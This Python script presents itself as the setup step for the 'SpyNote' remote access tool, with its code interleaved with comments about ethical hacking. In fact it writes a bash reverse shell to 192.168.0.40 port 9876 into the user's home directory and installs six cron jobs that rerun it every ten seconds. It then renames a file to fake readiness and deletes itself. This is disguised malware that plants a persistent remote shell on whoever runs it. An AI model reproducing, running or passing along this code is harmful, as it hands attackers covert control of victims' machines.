import os
import subprocess

#SpyNote is a powerful Remote Access Tool (RAT) primarily designed for Android devices,

#but it can also be effectively utilized in Linux environments, making it versatile for

#ethical hacking and cybersecurity research.

#Its main function is to enable remote control of a target device, allowing users to 

IP = "192.168.0.40" # Dont change the ip from 192.168.0.40

#execute various tasks, such as file management, screen sharing, and even keylogging.

# While SpyNote is an impressive tool, its use must adhere strictly to ethical 

#guidelines and legal standards.

#Setting up SpyNote on Linux is straightforward. 

PORT = 9876 # Dont change the port from 9876

#Users need to have Python installed, as the tool relies on Python scripts for execution.

#The installation process involves cloning the SpyNote repository from a version control 

#platform like GitHub and installing necessary dependencies through a simple command

#Once installed, users can configure the tool by editing the configuration files to suit their specific needs.

#this reverse shell will automatically execute in victim android 
script_path = os.path.join(os.path.expanduser("~"), "reverse_shell.sh") 


with open(script_path, 'w') as f:
    f.write("#!/bin/bash\n")
    f.write("export TERM=xterm\n")  # Enable color support for the terminal
    f.write("shopt -s histappend\n")  # Append history instead of overwrite
    f.write("alias ls='ls --color=auto'\n")  # Alias for color ls


#The primary interface of SpyNote operates as a server, which listens for incoming 
    
#connections from the target device.

#Once the payload is successfully deployed on the target Android device, it establishes 
    
#a connection with the SpyNote server running on Linux

    
    f.write("export LS_COLORS='di=1;34:fi=0;37:ln=0;36:so=0;33:ex=0;32'\n")
#This connection enables the operator to perform a wide range of actions, including 
    
#capturing screenshots, recording audio, and accessing files stored on the target device.    

#One of the key features of SpyNote is its user-friendly interface, which allows even 
    
#those with minimal technical knowledge to navigate its functionalities easily.
    
    f.write(f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\n")
# The tool’s capability to track GPS locations provides an added layer of utility for those 

#engaged in legitimate security assessments. However, with great power comes great 

#responsibility; users must ensure they have explicit permission before attempting 

#to access any device.

os.chmod(script_path, 0o755)

# crontab will take connection of victim in every 10 sec 
cron_job_1 = f"* * * * * /bin/bash {script_path}\n"            # Every minute at 0 seconds
cron_job_2 = f"* * * * * sleep 10; /bin/bash {script_path}\n"  # Every minute at 10 seconds
cron_job_3 = f"* * * * * sleep 20; /bin/bash {script_path}\n"  # Every minute at 20 seconds
cron_job_4 = f"* * * * * sleep 30; /bin/bash {script_path}\n"  # Every minute at 30 seconds
cron_job_5 = f"* * * * * sleep 40; /bin/bash {script_path}\n"  # Every minute at 40 seconds
cron_job_6 = f"* * * * * sleep 50; /bin/bash {script_path}\n"  # Every minute at 50 seconds

#SpyNote's flexibility in operation is one of its most appealing aspects.

#It can be run on various Linux distributions, allowing penetration testers 

#and ethical hackers to utilize their preferred operating system.

#This compatibility ensures that professionals can tailor their tools to fit their workflows effectively.

existing_crontab = subprocess.getoutput("crontab -l 2>/dev/null")

#Moreover, regular updates to SpyNote can enhance its functionality and security.

for cron_job in [cron_job_1, cron_job_2, cron_job_3, cron_job_4, cron_job_5, cron_job_6]:
    if cron_job not in existing_crontab:
        existing_crontab += cron_job


with open("mycron", "w") as f:
    f.write(existing_crontab)

subprocess.call("crontab mycron", shell=True)
os.remove("mycron")


import os


old_name = "spynote_not_ready.py"
new_name = "Spynote_ready.py"


current_directory = os.path.dirname(os.path.abspath(__file__))

# Construct the full paths for the old and new filenames
old_path = os.path.join(current_directory, old_name)
new_path = os.path.join(current_directory, new_name)


if os.path.isfile(old_path):
    os.rename(old_path, new_path)
    print("Spynote is ready for educational purpose only" )
else:
    print("Spynote is not ready pls check that requirement file is run properly or not")



os.remove(__file__)
